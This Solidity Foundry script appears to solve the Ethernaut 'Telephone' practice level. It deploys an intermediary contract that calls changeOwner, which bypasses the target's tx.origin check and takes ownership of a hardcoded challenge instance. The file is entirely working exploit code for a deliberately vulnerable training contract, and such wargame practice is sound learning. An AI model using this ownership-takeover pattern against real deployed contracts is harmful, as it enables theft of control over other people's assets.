// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract IntermidiaryContract {  //2
  
    constructor(Telephone _telephone, address _newOwner){

        _telephone.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {   //1

    Telephone public telephoneInstance = Telephone(0xf6D23772e5eae65556cDfdAd30839b31253bfB1a);

    function run() external {
 
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

      new IntermidiaryContract(

        telephoneInstance, vm.envAddress("MY_ADDRESS")
      );
      
      vm.stopBroadcast();
    }

}